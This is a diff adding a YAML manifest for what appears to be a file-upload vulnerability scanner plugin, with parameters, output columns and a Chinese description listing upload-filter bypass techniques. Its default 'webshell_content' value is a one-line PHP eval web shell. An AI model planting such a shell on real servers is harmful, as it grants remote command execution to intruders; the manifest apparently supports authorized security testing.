@@ -1,0 +1,51 @@
+name: file-upload
+version: 1.0.0
+description: 文件上传漏洞检测 — 无验证/前端验证/.htaccess/MIME绕过/00截断/后缀大小写/点绕过/空格绕过/双写后缀/文件头检查/getimagesize/exif_imagetype/二次渲染
+category: vuln
+engine: python
+
+params:
+  - name: url
+    label: 上传接口 URL
+    type: string
+    required: true
+    placeholder: "http://example.com/upload.php"
+  - name: file_field
+    label: 文件表单字段名
+    type: string
+    default: "file"
+    placeholder: "file"
+  - name: extra_fields
+    label: 额外表单字段（JSON）
+    type: string
+    placeholder: '{"submit": "upload"}'
+  - name: cookie
+    label: Cookie
+    type: string
+    placeholder: "PHPSESSID=abc123"
+  - name: verify_url
+    label: 上传后访问路径（用 {filename} 占位）
+    type: string
+    placeholder: "http://example.com/uploads/{filename}"
+  - name: webshell_content
+    label: Webshell 内容
+    type: string
+    default: "<?php @eval($_POST['cmd']); ?>"
+  - name: success_marker
+    label: 上传成功标记（响应中包含的文本）
+    type: string
+    placeholder: "上传成功"
+  - name: timeout
+    label: 超时(秒)
+    type: number
+    default: 10
+
+output:
+  type: table
+  columns:
+    - { key: "test", label: "测试类型" }
+    - { key: "filename", label: "文件名" }
+    - { key: "content_type", label: "Content-Type" }
+    - { key: "status", label: "上传状态" }
+    - { key: "accessible", label: "可访问" }
+    - { key: "evidence", label: "依据" }
